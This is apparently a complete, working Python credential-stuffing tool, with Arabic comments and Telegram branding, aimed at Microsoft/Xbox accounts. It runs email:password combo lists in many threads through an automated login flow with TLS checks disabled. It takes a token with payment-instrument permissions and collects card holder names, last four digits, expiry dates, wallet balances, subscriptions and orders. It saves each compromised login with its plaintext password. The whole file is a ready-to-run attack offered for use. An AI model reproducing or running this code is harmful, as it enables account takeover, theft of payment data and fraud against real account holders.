#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════╗
║          XBOX FULL CAP Checker               ║
║                                              ║
║  © @Mr_Hammad00                              ║ 
║  https://t.me/accountvaultportal             ║           
╚══════════════════════════════════════════════╝

يفحص حسابات Microsoft/Xbox ويستخرج:
  - بطاقات الائتمان (رقم، نوع، تاريخ الانتهاء)
  - رصيد المحفظة
  - اشتراكات Xbox (Game Pass / Gold)
  - الطلبات الأخيرة

الاستخدام:
    python xbox_checker.py
"""

import json
import os
import re
import sys
import uuid
import threading
import time
import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, urlparse, parse_qs

try:
    import requests
    from requests.exceptions import RequestException
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] قم بتشغيل: pip install requests")
    sys.exit(1)


# ═══════════════════════════════════════════════
#  ثوابت
# ═══════════════════════════════════════════════
CLIENT_ID = "0000000048170EF2"
ATK_CLIENT_ID = "000000000004773A"   # silent delegate

UA_EDGE = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
)

HEADERS_BASE = {
    "User-Agent":               UA_EDGE,
    "Accept-Language":          "en-US,en;q=0.9",
    "sec-ch-ua":                '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    "sec-ch-ua-mobile":         "?0",
    "sec-ch-ua-platform":       '"Windows"',
    "sec-ch-ua-platform-version": '"12.0.0"',
    "X-Edge-Shopping-Flag":     "1",
}

COUNTRY_MAP = {
    "AF":"Afghanistan","AL":"Albania","DZ":"Algeria","AD":"Andorra","AO":"Angola",
    "AR":"Argentina","AM":"Armenia","AU":"Australia","AT":"Austria","AZ":"Azerbaijan",
    "BH":"Bahrain","BD":"Bangladesh","BY":"Belarus","BE":"Belgium","BR":"Brazil",
    "BN":"Brunei","BG":"Bulgaria","CA":"Canada","CL":"Chile","CN":"China",
    "CO":"Colombia","HR":"Croatia","CU":"Cuba","CY":"Cyprus","CZ":"Czech Republic",
    "DK":"Denmark","EG":"Egypt","EE":"Estonia","FI":"Finland","FR":"France",
    "DE":"Germany","GH":"Ghana","GR":"Greece","HK":"Hong Kong S.A.R.","HU":"Hungary",
    "IN":"India","ID":"Indonesia","IR":"Iran","IQ":"Iraq","IE":"Ireland",
    "IL":"Israel","IT":"Italy","JP":"Japan","JO":"Jordan","KZ":"Kazakhstan",
    "KE":"Kenya","KR":"Korea","KW":"Kuwait","LV":"Latvia","LB":"Lebanon",
    "LY":"Libya","LT":"Lithuania","LU":"Luxembourg","MY":"Malaysia","MX":"Mexico",
    "MA":"Morocco","NL":"Netherlands, The","NZ":"New Zealand","NG":"Nigeria",
    "NO":"Norway","OM":"Oman","PK":"Pakistan","PA":"Panama","PH":"Philippines",
    "PL":"Poland","PT":"Portugal","QA":"Qatar","RO":"Romania","RU":"Russia",
    "SA":"Saudi Arabia","RS":"Serbia","SG":"Singapore","SK":"Slovakia",
    "ZA":"South Africa","ES":"Spain","LK":"Sri Lanka","SE":"Sweden",
    "CH":"Switzerland","SY":"Syria","TW":"Taiwan","TH":"Thailand","TN":"Tunisia",
    "TR":"Turkey","UA":"Ukraine","AE":"United Arab Emirates","GB":"United Kingdom",
    "US":"United States","UY":"Uruguay","UZ":"Uzbekistan","VE":"Venezuela",
    "VN":"Vietnam","YE":"Yemen","ZM":"Zambia","ZW":"Zimbabwe",
}

PRODUCT_TYPE_MAP = {
    "PASS": "XBOX GAME PASS",
    "GOLD": "XBOX GOLD",
}

# ═══════════════════════════════════════════════
#  قفل الطباعة
# ═══════════════════════════════════════════════
_print_lock = threading.Lock()

def cprint(text: str) -> None:
    with _print_lock:
        print(text)

def clog(tag: str, msg: str, color: str = "") -> None:
    codes = {"green": "\033[92m", "red": "\033[91m",
             "yellow": "\033[93m", "cyan": "\033[96m"}
    c = codes.get(color, "")
    r = "\033[0m" if color else ""
    with _print_lock:
        print(f"{c}[{tag}]{r} {msg}")


# ═══════════════════════════════════════════════
#  مساعدات
# ═══════════════════════════════════════════════
def parse_lr(text: str, left: str, right: str) -> str:
    try:
        s = text.index(left) + len(left)
        e = text.index(right, s)
        return text[s:e]
    except ValueError:
        return ""


def _extract_server_data(body: str) -> dict:
    m = re.search(r'ServerData\s*=\s*(\{.*?\})\s*;', body, re.DOTALL)
    if not m:
        return {}
    try:
        return json.loads(m.group(1))
    except Exception:
        return {}


def make_session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    retry = Retry(
        total=2,
        backoff_factor=0.5,
        status_forcelist=[500, 502, 503, 504],
        allowed_methods=["GET", "POST"],
        raise_on_status=False,
    )
    adapter = HTTPAdapter(max_retries=retry)
    s.mount("https://", adapter)
    s.mount("http://",  adapter)
    return s


def get_downloads_path() -> str:
    for p in [
        "/sdcard/Download",
        "/storage/emulated/0/Download",
        os.path.expanduser("~/storage/downloads"),
        os.path.expanduser("~/Download"),
        os.path.expanduser("~/Downloads"),
    ]:
        if os.path.isdir(p):
            return p
    return "."


# ═══════════════════════════════════════════════
#  الخطوة 0: جلب صفحة تسجيل الدخول (PPFT)
# ═══════════════════════════════════════════════
def fetch_login_page(session: requests.Session, email: str) -> dict:
    uaid = uuid.uuid4().hex
    url = (
        "https://login.live.com/oauth20_authorize.srf"
        f"?client_id={CLIENT_ID}"
        "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
        "&response_type=token"
        "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
        "&display=touch"
        f"&username={quote(email)}"
        f"&uaid={uaid}"
    )
    headers = {
        **HEADERS_BASE,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    resp = session.get(url, headers=headers, allow_redirects=True, timeout=20)
    body      = resp.text
    final_url = resp.url

    sd = _extract_server_data(body)

    # ── PPFT ──
    ppft = ""
    if sd:
        ft = sd.get("sFTTag", "")
        m  = re.search(r'value="([^"]+)"', ft)
        if m:
            ppft = m.group(1)
        if not ppft:
            ppft = sd.get("sFT", "")
    if not ppft:
        ppft = (
            parse_lr(body, 'name="PPFT" id="i0327" value="', '"')
            or parse_lr(body, 'name="PPFT" value="', '"')
            or parse_lr(body, '"sFT":"', '"')
        )

    # ── POST URL ──
    post_url = sd.get("urlPost", "") if sd else ""
    if not post_url or "ppsecure" not in post_url:
        post_url = parse_lr(body, 'action="', '"')
    if not post_url or "ppsecure" not in post_url:
        qs = parse_qs(urlparse(final_url).query)
        uid = qs.get("uaid", [uaid])[0]
        post_url = (
            f"https://login.live.com/ppsecure/post.srf"
            f"?client_id={CLIENT_ID}&uaid={uid}&pid=15216"
        )

    if not ppft:
        return {"ok": False, "reason": "فشل استخراج PPFT"}

    return {
        "ok":          True,
        "ppft":        ppft,
        "post_url":    post_url,
        "canary":      sd.get("sCanary", "") or sd.get("canary", "") if sd else "",
        "ctx":         sd.get("sCtx", "")    or sd.get("sContext", "") if sd else "",
        "rng_default": sd.get("sPOST_PaginatedLoginStateRNGCDefaultType", "") if sd else "",
        "rng_entropy": sd.get("sPOST_PaginatedLoginStateRNGCEntropy", "")      if sd else "",
        "rng_slk":     sd.get("sPOST_PaginatedLoginState", "")                 if sd else "",
        "uaid":        parse_qs(urlparse(final_url).query).get("uaid", [uaid])[0],
    }


# ═══════════════════════════════════════════════
#  الخطوة 1: تسجيل الدخول
# ═══════════════════════════════════════════════
def step_login(session: requests.Session, email: str, password: str) -> dict:
    page = fetch_login_page(session, email)
    if not page["ok"]:
        return {"status": "fail", "reason": page["reason"]}

    ppft     = page["ppft"]
    post_url = page["post_url"]
    ctx      = page.get("ctx", "")
    if not ctx and post_url:
        ctx = parse_qs(urlparse(post_url).query).get("ctx", [""])[0]

    payload = {
        "ps":                    "2",
        "psRNGCDefaultType":     page.get("rng_default", ""),
        "psRNGCEntropy":         page.get("rng_entropy", ""),
        "psRNGCSLK":             page.get("rng_slk",     ""),
        "canary":                page.get("canary",      ""),
        "ctx":                   ctx,
        "hpgrequestid":          "",
        "PPFT":                  ppft,
        "PPSX":                  "PassportRN",
        "NewUser":               "1",
        "FoundMSAs":             "",
        "fspost":                "0",
        "i21":                   "0",
        "CookieDisclosure":      "0",
        "IsFidoSupported":       "1",
        "isSignupPost":          "0",
        "isRecoveryAttemptPost": "0",
        "i13":                   "1",
        "login":                 email,
        "loginfmt":              email,
        "type":                  "11",
        "LoginOptions":          "1",
        "lrt":                   "",
        "lrtPartition":          "",
        "hisRegion":             "",
        "hisScaleUnit":          "",
        "passwd":                password,
    }

    referer = (
        f"https://login.live.com/oauth20_authorize.srf?client_id={CLIENT_ID}"
        "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
        "&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
        f"&display=touch&username={quote(email)}"
    )
    headers = {
        **HEADERS_BASE,
        "Accept":                  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding":         "gzip, deflate",
        "Cache-Control":           "max-age=0",
        "Connection":              "keep-alive",
        "Content-Type":            "application/x-www-form-urlencoded",
        "Host":                    "login.live.com",
        "Origin":                  "https://login.live.com",
        "Referer":                 referer,
        "Sec-Fetch-Dest":          "document",
        "Sec-Fetch-Mode":          "navigate",
        "Sec-Fetch-Site":          "same-origin",
        "Sec-Fetch-User":          "?1",
        "Upgrade-Insecure-Requests": "1",
    }

    resp      = session.post(post_url, data=payload, headers=headers, allow_redirects=True, timeout=20)
    final_url = resp.url
    body      = resp.text
    cookies   = {c.name: c.value for c in session.cookies}

    # FAIL
    if any(k in body for k in [
        "Your account or password is incorrect.",
        "That Microsoft account doesn't exist. Enter a different account",
        "Sign in to your Microsoft account",
    ]):
        return {"status": "fail", "reason": "@Mr_Hammad00"}

    if "timed out" in body:
        return {"status": "fail", "reason": "timeout"}

    # BAN
    if ",AC:null,urlFedConvertRename" in body:
        return {"status": "ban", "reason": "IP محظور"}

    # 2FA / Custom
    for kw in ["account.live.com/recover?mkt", "recover?mkt",
                "account.live.com/identity/confirm?mkt",
                "Email/Confirm?mkt", "/cancel?mkt=", "/Abuse?mkt="]:
        if kw in body or kw in final_url:
            return {"status": "2fa", "reason": "@Mr_Hammad00"}

    # SUCCESS
    has_anon  = "ANON"          in cookies
    has_wlssc = "WLSSC"         in cookies
    has_token = "access_token=" in final_url

    if has_anon or has_wlssc or has_token:
        atk = (
            parse_lr(final_url, "access_token=", "&token_type")
            or parse_lr(final_url, "access_token=", "&")
            or ""
        )
        return {
            "status":       "success",
            "access_token": atk,
            "cid":          cookies.get("MSPCID", "").upper(),
            "cookies":      cookies,
        }

    return {"status": "fail", "reason": f"غير معروف | {final_url[:80]}"}


# ═══════════════════════════════════════════════
#  الخطوة 2: الحصول على ATK عبر silent delegate
# ═══════════════════════════════════════════════
def step_get_atk(session: requests.Session) -> str:
    url = (
        "https://login.live.com/oauth20_authorize.srf"
        f"?client_id={ATK_CLIENT_ID}"
        "&response_type=token"
        "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
        "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
        "&prompt=none"
    )
    headers = {
        **HEADERS_BASE,
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection":      "close",
        "Referer":         "https://account.microsoft.com/",
    }
    try:
        resp = session.get(url, headers=headers, allow_redirects=True, timeout=20)
        atk  = (
            parse_lr(resp.url, "access_token=", "&token_type")
            or parse_lr(resp.url, "access_token=", "&")
        )
        return atk
    except Exception:
        return ""


# ═══════════════════════════════════════════════
#  الخطوة 3: بطاقات الدفع
# ═══════════════════════════════════════════════
def step_get_payment_instruments(session: requests.Session, atk: str) -> dict:
    url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
    headers = {
        "User-Agent":     UA_EDGE,
        "Accept":         "application/json",
        "Accept-Encoding":"gzip, deflate, br",
        "Accept-Language":"en-US,en;q=0.9",
        "Authorization":  f'MSADELEGATE1.0="{atk}"',
        "Connection":     "keep-alive",
        "Content-Type":   "application/json",
        "Host":           "paymentinstruments.mp.microsoft.com",
        "ms-cV":          "FbMB+cD6byLL1mn4W/NuGH.2",
        "Origin":         "https://account.microsoft.com",
        "Referer":        "https://account.microsoft.com/",
        "Pragma":         "no-cache",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
    }
    try:
        resp = session.get(url, headers=headers, timeout=20)
        body = resp.text
        data = resp.json() if resp.headers.get("content-type","").startswith("application/json") else {}

        cards    = []
        balance  = ""
        country  = ""

        # استخراج البلد
        country_code = parse_lr(body, '"country":"', '"') or parse_lr(body, '"country": "', '"')
        country = COUNTRY_MAP.get(country_code.upper(), country_code)

        # استخراج الرصيد
        bal_raw = parse_lr(body, 'balance":', ',"')
        if bal_raw:
            balance = bal_raw.strip().strip('"')

        # استخراج البطاقات
        if "lastFourDigits" in body:
            instruments = data.get("items", data.get("paymentInstruments", []))
            if isinstance(instruments, list):
                for item in instruments:
                    last4  = item.get("lastFourDigits", "")
                    if not last4:
                        continue
                    holder = item.get("accountHolderName", "")
                    cc_name = (
                        item.get("display", {}).get("name", "")
                        or item.get("paymentMethodFamily", "")
                    )
                    exp_m  = item.get("expiryMonth", "")
                    exp_y  = item.get("expiryYear", "")
                    c_type = item.get("cardType", "")
                    cards.append({
                        "holder":  holder,
                        "name":    cc_name,
                        "last4":   last4,
                        "expiry":  f"{exp_m}/{exp_y}",
                        "type":    c_type,
                    })
            else:
                # fallback: parse يدوي
                for chunk in body.split('"lastFourDigits":"')[1:]:
                    last4  = parse_lr(chunk, "", '"')
                    holder = parse_lr(body, '"accountHolderName":"', '"')
                    exp_m  = parse_lr(chunk, '"expiryMonth":"', '"')
                    exp_y  = parse_lr(chunk, '"expiryYear":"', '"')
                    cards.append({"holder": holder, "last4": last4, "expiry": f"{exp_m}/{exp_y}", "name": "", "type": ""})

        return {"cards": cards, "balance": balance, "country": country, "raw": body}
    except Exception as e:
        return {"cards": [], "balance": "", "country": "", "raw": "", "error": str(e)}


# ═══════════════════════════════════════════════
#  الخطوة 4: الاشتراكات والطلبات
# ═══════════════════════════════════════════════
def step_get_transactions(session: requests.Session, atk: str) -> dict:
    url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
    headers = {
        "User-Agent":     UA_EDGE,
        "Accept":         "application/json",
        "Accept-Encoding":"gzip, deflate, br",
        "Accept-Language":"en-US,en;q=0.9",
        "Authorization":  f'MSADELEGATE1.0="{atk}"',
        "Connection":     "keep-alive",
        "Content-Type":   "application/json",
        "Host":           "paymentinstruments.mp.microsoft.com",
        "ms-cV":          "FbMB+cD6byLL1mn4W/NuGH.2",
        "Origin":         "https://account.microsoft.com",
        "Referer":        "https://account.microsoft.com/",
        "Pragma":         "no-cache",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
    }
    try:
        resp = session.get(url, headers=headers, timeout=20)
        body = resp.text
        data = resp.json() if resp.headers.get("content-type","").startswith("application/json") else {}

        subscriptions = []
        orders        = []

        # اشتراكات
        for sub in data.get("subscriptions", []):
            title    = sub.get("title", "")
            pt_raw   = sub.get("productType", "")
            pt       = PRODUCT_TYPE_MAP.get(pt_raw.upper(), pt_raw)
            desc     = sub.get("description", "")
            qty      = sub.get("quantity", "")
            currency = sub.get("currency", "")
            amount   = sub.get("totalAmount", "")
            subscriptions.append({
                "title": title, "type": pt, "desc": desc,
                "qty":   qty,   "price": f"{amount} {currency}".strip(),
            })

        # طلبات
        for order in data.get("orders", []):
            title    = order.get("title", "")
            desc     = order.get("description", "")
            qty      = order.get("quantity", "")
            currency = order.get("currency", "")
            amount   = order.get("totalAmount", "")
            orders.append({
                "title": title, "desc": desc,
                "qty":   qty,   "price": f"{amount} {currency}".strip(),
            })

        # fallback parse يدوي
        if not subscriptions and '"title":"' in body:
            for chunk in body.split('"title":"')[1:]:
                title = parse_lr(chunk, "", '"')
                pt_raw = parse_lr(body, '"productType":"', '"')
                pt = PRODUCT_TYPE_MAP.get(pt_raw.upper(), pt_raw)
                subscriptions.append({"title": title, "type": pt, "desc": "", "qty": "", "price": ""})

        return {"subscriptions": subscriptions, "orders": orders}
    except Exception as e:
        return {"subscriptions": [], "orders": [], "error": str(e)}


# ═══════════════════════════════════════════════
#  حفظ Hit في الملف
# ═══════════════════════════════════════════════
def save_hit(hits_file: str, email: str, password: str,
             country: str, balance: str,
             cards: list, subscriptions: list, orders: list) -> None:
    lines = ["═" * 54]
    lines.append(f"Email      : {email}")
    lines.append(f"Password   : {password}")
    if country:
        lines.append(f"Country    : {country}")
    if balance:
        lines.append(f"Balance    : {balance}")

    if cards:
        lines.append(f"── Cards ({len(cards)}) ──")
        for c in cards:
            lines.append(
                f"  [{c.get('name','CC')}] *{c.get('last4','')} "
                f"| Exp: {c.get('expiry','')} | {c.get('type','')} "
                f"| {c.get('holder','')}"
            )
    else:
        lines.append("Cards      : None")

    if subscriptions:
        lines.append(f"── Subscriptions ({len(subscriptions)}) ──")
        for s in subscriptions:
            lines.append(f"  {s.get('type') or s.get('title','')} | {s.get('price','')} | {s.get('desc','')}")

    if orders:
        lines.append(f"── Orders ({len(orders)}) ──")
        for o in orders:
            lines.append(f"  {o.get('title','')} | {o.get('price','')} | {o.get('qty','')}x")

    lines.append("═" * 54)
    entry = "\n".join(lines) + "\n\n"
    with _print_lock:
        with open(hits_file, "a", encoding="utf-8") as fh:
            fh.write(entry)


# ═══════════════════════════════════════════════
#  تشغيل حساب واحد
# ═══════════════════════════════════════════════
def run(email: str, password: str, hits_file: str) -> str:
    session = make_session()
    try:
        # 1 ─ تسجيل الدخول
        login = step_login(session, email, password)
        status = login["status"]

        if status == "ban":
            clog("BAN",  f"{email} | {login.get('reason','')}", "yellow")
            return "ban"
        if status == "2fa":
            clog("2FA",  f"{email} | {login.get('reason','')}", "yellow")
            return "2fa"
        if status != "success":
            clog("FAIL", f"{email} | {login.get('reason','')}", "red")
            return "fail"

        # 2 ─ ATK
        atk = login.get("access_token", "") or step_get_atk(session)
        if not atk:
            clog("FAIL", f"{email} | لم يُستخرج ATK", "red")
            return "fail"

        # 3 ─ بطاقات الدفع
        payment = step_get_payment_instruments(session, atk)
        cards   = payment.get("cards", [])
        balance = payment.get("balance", "")
        country = payment.get("country", "")

        # 4 ─ الاشتراكات والطلبات
        txn           = step_get_transactions(session, atk)
        subscriptions = txn.get("subscriptions", [])
        orders        = txn.get("orders", [])

        # ── عرض النتائج ──
        out = [
            "",
            "  " + "═" * 52,
            f"\033[92m[HIT]\033[0m {email}:{password}",
        ]
        if country:
            out.append(f"    Country      : {country}")
        if balance:
            out.append(f"    Balance      : {balance}")

        if cards:
            out.append(f"    Cards ({len(cards)}):")
            for c in cards:
                out.append(
                    f"      [{c.get('name','CC')}] *{c.get('last4','')} "
                    f"| {c.get('expiry','')} | {c.get('type','')} | {c.get('holder','')}"
                )
        else:
            out.append("    Cards        : ❌ None")

        if subscriptions:
            out.append(f"    Subs ({len(subscriptions)}):")
            for s in subscriptions:
                out.append(f"      ✅ {s.get('type') or s.get('title','')} | {s.get('price','')}")
        else:
            out.append("    Subscriptions: ❌ None")

        if orders:
            out.append(f"    Orders ({len(orders)}):")
            for o in orders:
                out.append(f"      📦 {o.get('title','')} | {o.get('price','')}")

        out.append("  " + "═" * 52)
        cprint("\n".join(out))

        # ── حفظ في الملف ──
        if hits_file:
            save_hit(hits_file, email, password, country, balance,
                     cards, subscriptions, orders)

        return "hit"

    except requests.exceptions.Timeout:
        clog("TIMEOUT", f"{email}", "yellow")
        return "fail"
    except requests.exceptions.ConnectionError:
        clog("ERROR",   f"{email} | خطأ اتصال", "yellow")
        return "fail"
    except Exception as e:
        clog("ERROR",   f"{email} | {type(e).__name__}: {e}", "red")
        return "fail"


# ═══════════════════════════════════════════════
#  Rate Limiter
# ═══════════════════════════════════════════════
class RateLimiter:
    def __init__(self, cpm: int):
        self.delay = 60.0 / cpm
        self._lock = threading.Lock()
        self._last = 0.0

    def acquire(self):
        with self._lock:
            wait = self._last + self.delay - time.monotonic()
            if wait > 0:
                time.sleep(wait)
            self._last = time.monotonic()


# ═══════════════════════════════════════════════
#  Main
# ═══════════════════════════════════════════════
def main() -> None:
    print()
    print("  ╔══════════════════════════════════════════════╗")
    print("  ║          XBOX FULL CAP Checker               ║")
    print("  ║   © https://t.me/accountvaultportal     ")     
    print("  ╚══════════════════════════════════════════════╝")
    print()

    # ── ملف الحسابات ──
    while True:
        fpath = input("  📂 Drop Your combo list (email:password) : ").strip()
        if not fpath:
            print("  [!] أدخل اسم الملف"); continue
        try:
            with open(fpath, encoding="utf-8", errors="ignore") as fh:
                lines = [l.strip() for l in fh if l.strip() and ":" in l]
            if not lines:
                print("  [!] الملف فارغ أو صيغة خاطئة"); continue
            break
        except FileNotFoundError:
            print(f"  [!] الملف غير موجود: {fpath}")

    # ── CPM ──
    while True:
        v = input("  ⚡ CPM (500-1000%) : ").strip()
        if v.isdigit() and int(v) > 0:
            cpm = int(v); break
        print("  [!] أدخل رقماً أكبر من صفر")

    threads = min(max(cpm // 10, 1), 50)

    # ── مسار الـ Hits ──
    dl_dir    = get_downloads_path()
    ts        = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    hits_file = os.path.join(dl_dir, f"xbox_hits_{ts}.txt")
    with open(hits_file, "w", encoding="utf-8") as fh:
        fh.write("XBOX FULL CAP Checker — @hulliyu | https://t.me/bitchenlll\n")
        fh.write(f"Date : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        fh.write("═" * 54 + "\n\n")

    print()
    print(f"  Total Lines : {len(lines)}")
    print(f"  CPM     : {cpm}  |  Threads: {threads}")
    print(f"  Hits    : {hits_file}")
    print()

    # ── إحصائيات ──
    stats   = {"hit": 0, "fail": 0, "2fa": 0, "ban": 0, "done": 0}
    s_lock  = threading.Lock()
    rl      = RateLimiter(cpm)
    total   = len(lines)
    start_t = time.monotonic()

    def worker(line: str):
        parts = line.split(":", 1)
        if len(parts) != 2:
            return
        email, password = parts[0].strip(), parts[1].strip()
        rl.acquire()
        result = run(email, password, hits_file)
        with s_lock:
            stats[result] = stats.get(result, 0) + 1
            stats["done"] += 1
            done = stats["done"]

        elapsed = time.monotonic() - start_t
        speed   = done / elapsed * 60 if elapsed > 0 else 0
        filled  = int(done / total * 28)
        bar     = "█" * filled + "░" * (28 - filled)
        with _print_lock:
            print(
                f"\r  [{bar}] {done}/{total} | "
                f"✅{stats['hit']} ❌{stats['fail']} "
                f"🔒{stats['2fa']} 🚫{stats['ban']} "
                f"⚡{speed:.0f}cpm   ",
                end="", flush=True,
            )

    try:
        with ThreadPoolExecutor(max_workers=threads) as pool:
            futures = [pool.submit(worker, l) for l in lines]
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception:
                    pass
    except KeyboardInterrupt:
        print()
        print("  [STOP] توقف بواسطة المستخدم.")

    # ── ملخص ──
    elapsed = time.monotonic() - start_t
    print()
    print("  ══════════════════════════════════════════════")
    print(f"  ✅ Hits          : {stats['hit']}")
    print(f"  ❌ Fails         : {stats['fail']}")
    print(f"  🔒 2FA           : {stats['2fa']}")
    print(f"  🚫 Ban           : {stats['ban']}")
    print(f"  ⏱  الوقت        : {elapsed:.1f}s | إجمالي: {total}")
    if stats["hit"] > 0:
        print(f"  💾 محفوظ في     : {hits_file}")
    print("  ══════════════════════════════════════════════")
    print()


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
